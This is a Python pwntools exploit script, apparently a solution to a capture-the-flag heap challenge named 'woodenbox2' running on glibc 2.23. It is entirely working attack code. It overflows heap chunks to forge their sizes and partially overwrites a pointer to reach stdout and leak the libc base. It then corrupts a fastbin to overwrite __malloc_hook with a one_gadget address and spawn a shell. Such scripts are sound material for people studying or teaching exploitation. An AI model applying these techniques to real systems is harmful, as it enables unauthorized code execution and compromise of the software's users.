#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level='debug'

if(sys.argv[1] == 'l'):
	p = process("./woodenbox2")
	elf = ELF("./woodenbox2",checksec=False)
	libc = ELF("./libc6_2.23-0ubuntu11_amd64.so",checksec=False)
else:
	p = remote()
	elf = ELF("./")


def menu(cmd):
    sla("Your choice:",str(cmd))

def add(sz,ct):
    menu(1)
    sla("Please enter the length of item name:",str(sz))
    sda("Please enter the name of item:",ct)

def change(idx,sz,ct):
    menu(2)
    sla("Please enter the index of item:",str(idx))
    sla("Please enter the length of item name:",str(sz))
    sda("Please enter the new name of the item:",ct)

def delete(idx):
    menu(3)
    sla("Please enter the index of item:",str(idx))


###leak libc###
add(0x20,'AAAA')#0
add(0x20,'AAAA')#1
add(0x30,'BBBB')#2
add(0x60,'CCCC')#3
add(0x30,'DDDD')#4

payload = 'A' * 0x20 + p64(0) + p64(0xb1)
change(1,len(payload),payload)

delete(2)
delete(2)

add(0x30,'BBBB')

payload = 'A' * 0x30 + p64(0) + p64(0x71) + '\xdd' + '\xe5' 
change(0,len(payload),payload)

add(0x60,'CCCC')

payload = 'A' * 0x33 + p64(0xfbad1887) + p64(0) * 3 + '\0'
add(0x60,payload)
libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 0x3c5600
success(hex(libc_base))

###hijack malloc_hook###
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0xf02a4


add(0x60,'clear unsorted bin')#4
add(0x10,'BBBB')#5
add(0x60,'CCCC')#6
add(0x10,'DDDD')#7
delete(6)

payload = 'A' * 0x10 + p64(0) + p64(0x71) + p64(malloc_hook - 0x23)
change(4,len(payload),payload)

add(0x60,'AAAA')
payload = 'A' * 0x13 + p64(one_gadget)
add(0x60,payload)

###get shell###
menu(4)
ia()